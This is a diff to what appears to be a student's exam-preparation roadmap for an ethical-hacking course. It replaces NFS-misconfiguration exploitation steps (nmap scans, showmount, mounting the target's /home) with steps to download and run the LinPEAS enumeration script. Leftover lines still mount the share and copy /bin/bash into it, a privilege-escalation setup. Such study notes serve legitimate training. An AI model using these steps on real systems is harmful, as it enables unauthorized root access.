@@ -21,12 +21,12 @@ Exam RoadMap
 1,2,8,11,12,16,17,18,20,7 (10 marks)  10,19,4,5,15,14,13,6,3,9  
 
 **Priviledge Escalation**
-Exploiting misconfigured NFS (port 2049)
-1.	nmap -sV —p 2049 IP/Subnet
-2.	sudo apt-get install nfs-common
-3.	nmap -sV —script=nfs-showmount <Target_IP>
-4.	check available mounts: showmount -e <Target_IP> -> we will see /home directory
-5.	mkdir /tmp/nfs
+Use LinPeas
+1.	login to the ubuntu machine using the credentials given
+2.	go to google and type linpeas, go to the githu depository and download linpeas.sh (found on the release page) or use the command given 
+3.	go to download. Cd Downloads/ then ls to view contents
+4.	chmod +x linpeas to be  executable then ls
+5.	run the executable by using attacke-1:~/Downloads$ ./linpeas.sh
 6.	sudo mount -t nfs 10.10.1.9:/home /tmp/nfs
 7.	cd /tmp/nfs
 8.	sudo cp /bin/bash .
